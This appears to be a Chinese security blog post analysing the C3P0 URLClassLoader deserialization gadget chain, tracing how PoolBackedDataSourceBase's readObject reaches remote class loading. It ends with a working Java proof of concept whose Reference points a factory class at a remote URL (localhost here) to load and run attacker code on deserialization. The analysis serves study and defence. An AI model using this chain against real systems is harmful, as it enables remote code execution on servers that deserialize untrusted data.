## C3P0 URLClassLoader远程类加载

### 核心类

1. PoolBackedDataSourceBase
2. ReferenceIndirector$ReferenceSerialized
3. ReferenceableUtils

---

### PoolBackedDataSourceBase

重点在writeObject和readObject

![image-20260528191717965](E:\blog_back\source\_posts\CB链\image-20260528191717965.png)

![image-20260528191817141](E:\blog_back\source\_posts\CB链\image-20260528191817141.png)

来看看这个类 **ReferenceIndirector**

上面如果没有成功序列化 则会进入异常中 

进入**ReferenceIndirector.indirectForm**

![image-20260528191959983](E:\blog_back\source\_posts\CB链\image-20260528191959983.png)

调用**getReference()** 被调用的对象必须要继承**Reference接口**才行 不然直接就异常跳出了

后续会实例化一个**ReferenceSerialized**

注意这里的**ref可控 其他的参数都不可控**

**ref来自于ConnectionPoolDataSource成员对象**

实例化的作用就是填入一些内容而已

![image-20260528192301027](E:\blog_back\source\_posts\CB链\image-20260528192301027.png)

**writeObject方法**的下面又是类似的操作 只不过换成了**extensions** 我们这里没用到他

接下来看看**readObject方法**

![image-20260528192359550](E:\blog_back\source\_posts\CB链\image-20260528192359550.png)

判断对象里面是否有 **IndirectlySerialized**

有则调用**getObject方法**

这里实际上调用刚刚序列化的**IndirectlySerialized对象**的**getObject方法**

![image-20260528192632788](E:\blog_back\source\_posts\CB链\image-20260528192632788.png)

可以看到会调用**lookup方法** 那么可以直接打**jndi**吗

![image-20260528192845953](E:\blog_back\source\_posts\CB链\image-20260528192845953.png)

刚刚也就**reference**是可控的地方 **contextName**是不可控的

所以没法直接打jndi

进入下面的 `ReferenceableUtils.referenceToObject( reference, name, nameContext, env )`

![image-20260528193114617](E:\blog_back\source\_posts\CB链\image-20260528193114617.png)

![image-20260528193320344](E:\blog_back\source\_posts\CB链\image-20260528193320344.png)

这个部分会获取ref对象的工厂类名和工厂类的地址也就是url了

然后获取ClassLoader对象

![image-20260528193410242](E:\blog_back\source\_posts\CB链\image-20260528193410242.png)

将获取的url包装为一个URL对象 

创建一个URLCLassLoader对象 传入刚刚的URL对象和类加载器

这里指定类加载器尝试加载工厂类 `Class fClass = Class.forName( fClassName, true, cl );`

由于指定的是URLCLassLoader这个类加载器 那么他会尝试远程类加载

如果成功获取到相对于的类就直接实例化

---

我们只需要在PoolBackedDataSourceBase里面填入一个connectionPoolDataSource成员对象就可以了

![image-20260528193950357](E:\blog_back\source\_posts\CB链\image-20260528193950357.png)

调用setter就可以了

---

### POC

```java
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import  com.*;
import com.mchange.v2.ser.Indirector;

import javax.naming.*;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Properties;
import java.util.logging.Logger;

public class C3P0_URLClassLoader {
    public static void main(String[] args) throws Exception {
        PoolBackedDataSourceBase pool = new PoolBackedDataSourceBase(false);
        pool.setConnectionPoolDataSource(new datapool());


        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(pool);
        oos.flush();
        oos.close();
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();


    }
    static public class datapool implements ConnectionPoolDataSource, Referenceable {

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

        @Override
        public Reference getReference() throws NamingException {
            Reference ref = new Reference("Calc","Calc","http://127.0.0.1:8000/");
            return ref;
        }
    }
}
```

